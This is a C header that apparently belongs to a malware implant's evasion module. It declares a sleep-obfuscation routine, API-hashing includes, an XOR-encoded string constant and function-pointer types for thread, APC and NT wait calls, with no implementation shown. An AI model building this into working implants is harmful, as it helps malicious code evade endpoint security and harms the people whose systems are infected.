#ifndef _SLEEP_OBFUSCATION_H
#define _SLEEP_OBFUSCATION_H

#include "api_hashing.hpp"
#include "config_type.hpp"
#include "memory.hpp"
#include "utils.hpp"

#define KEY_SIZE 16
#define MODULE_SIZE(x) ((PIMAGE_NT_HEADERS)((UINT_PTR)x + ((PIMAGE_DOS_HEADER)x)->e_lfanew))->OptionalHeader.SizeOfImage
#define XOR_CRYPTSP "\xc9\xbe\xcb\x62\x60\x61\x21\x51\xce\xa0\xde"

void generate_random(config_t *config, uint8_t *buffer, size_t size);
void sleep_obfuscation(config_t *config, HANDLE wait_handle);

typedef struct ustring_s {
    uint32_t	length;
    uint32_t	maximum_length;
    void	*buffer;
} ustring_t, * pustring_t;

typedef HANDLE (WINAPI* fnCreateEventA)(
  LPSECURITY_ATTRIBUTES event_attributes,
  BOOL manual_reset,
  BOOL initial_state,
  char *name
);

typedef HANDLE (WINAPI* fnOpenThread)(
  uint32_t desired_access,
  BOOL inherit_handle,
  uint32_t thread_id
);

typedef uint32_t (WINAPI* fnGetCurrentThreadId)();

typedef BOOL (WINAPI* fnGetThreadContext)(
  HANDLE thread,
  LPCONTEXT context
);

typedef uint32_t (WINAPI* fnQueueUserAPC)(
  PAPCFUNC fnAPC,
  HANDLE thread,
  void *data
);

typedef BOOL (WINAPI* fnQueryPerformanceCounter)(
  LARGE_INTEGER *performance_count
);

typedef void (WINAPI* fnGetSystemTimeAsFileTime)(
  LPFILETIME system_time_as_file_time
);

typedef BOOL (WINAPI* fnRtlGenRandomFunc)(
  void *buffer,
  size_t size
);

typedef NTSTATUS (NTAPI* fnNtAlertResumeThread)(
  HANDLE thread,
  uint32_t *val
);

typedef NTSTATUS (NTAPI* fnNtSignalAndWaitForSingleObject)(
  HANDLE object_to_signal,
  HANDLE object_to_wait_on,
  BOOL alertable,
  PLARGE_INTEGER milliseconds
);


#endif
